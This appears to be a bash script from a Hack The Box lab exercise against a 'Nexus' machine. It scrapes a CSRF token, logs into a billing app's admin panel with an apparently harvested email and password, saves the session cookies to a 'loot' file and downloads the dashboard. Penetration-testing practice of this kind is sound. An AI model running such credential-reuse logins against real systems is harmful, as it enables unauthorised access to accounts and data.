#!/bin/bash
set -e
HOST="billing.nexus.htb"
IP=10.129.12.96
JAR=/mnt/c/HTB/Nexus/loot/E11_session_cookies.txt
rm -f "$JAR"

PAGE=$(curl -sS -c "$JAR" -H "Host: $HOST" "http://$IP/admin/login")
TOKEN=$(echo "$PAGE" | grep -oE 'name="_token" value="[^"]+"' | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')

curl -sS -i -c "$JAR" -b "$JAR" -H "Host: $HOST" \
  -X POST "http://$IP/admin/login" \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode "email=j.matthew@nexus.htb" \
  --data-urlencode "password=N27xh!!2ucY04" \
  -o /dev/null -D -

echo "=== dashboard ==="
curl -sS -b "$JAR" -H "Host: $HOST" "http://$IP/admin/dashboard" -o /mnt/c/HTB/Nexus/http/E11_dashboard.html -D -
